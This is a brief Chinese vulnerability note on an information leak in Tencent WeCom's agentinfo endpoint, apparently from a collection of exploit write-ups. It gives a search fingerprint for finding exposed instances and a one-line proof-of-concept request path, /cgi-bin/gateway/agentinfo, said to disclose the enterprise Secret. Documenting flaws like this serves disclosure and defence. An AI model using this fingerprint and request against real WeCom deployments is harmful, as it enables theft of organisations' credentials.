# 腾讯 企业微信 agentinfo 信息泄漏漏洞

## 漏洞描述

腾讯 企业微信 agentinfo 接口存在信息泄漏漏洞，攻击者通过漏洞可以获取企业微信 Secret

## 漏洞影响

<a-checkbox checked>腾讯 企业微信</a-checkbox></br>

## 网络测绘

<a-checkbox checked>web.body="wework_admin.normal_layout"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1691826671192-b1e9846a-3d9d-423e-aa0f-8800074af3c5.png)

验证POC

```php
/cgi-bin/gateway/agentinfo
```

![img](../../../.vuepress/public/img/1691826986597-d2dc28f9-7e86-4752-8fae-954bf44d5e0b.png)